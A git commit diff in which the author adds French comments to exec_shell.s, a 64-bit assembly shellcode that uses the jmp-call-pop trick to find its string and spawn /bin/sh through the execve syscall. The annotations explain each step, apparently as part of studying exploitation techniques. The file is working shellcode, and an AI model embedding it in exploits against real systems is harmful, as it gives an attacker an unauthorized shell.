93473e2f979bb25670ac01d604f29d526dc644d2
Ton <tongjian.zhang@laposte.net>
2024-12-07 12:48:33 +0100

    annoter comment obtenir une adresse avec pop

--- exec_shell.s
+++ exec_shell.s
@@ -1,15 +1,15 @@
 BITS 64
     jmp short two
 one:
-    pop rdi
+    pop rdi; obtient l'adresse de la chaîne
     xor rax, rax
     mov [rdi+7], al
-    mov [rdi+8], rdi
+    mov [rdi+8], rdi; recopier l'adresse à une adresse
     mov [rdi+16], rax
-    lea rsi, [rdi+8]
+    lea rsi, [rdi+8]; obtient l'adresse de l'adresse, cette adresse s'arrêtera à NULL
     lea rdx, [rdi+16]
     mov al, 0x3b
-    syscall
+    syscall; execve("/bin/sh",["/bin//sh",NULL],[NULL])
 two:
     call one
     db '/bin/shXAAAAAAAABBBBBBBB'
